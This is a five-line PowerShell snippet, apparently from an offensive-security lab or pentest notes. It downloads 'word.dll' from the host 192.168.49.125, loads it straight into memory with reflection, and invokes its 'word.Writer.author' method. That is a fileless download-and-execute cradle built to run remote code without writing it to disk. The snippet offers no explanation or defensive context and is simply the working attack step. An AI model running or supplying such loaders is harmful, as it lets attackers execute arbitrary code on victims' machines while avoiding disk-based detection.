$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.125/word.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("word.Writer")
$method = $class.GetMethod("author")
$method.Invoke(0, $null)
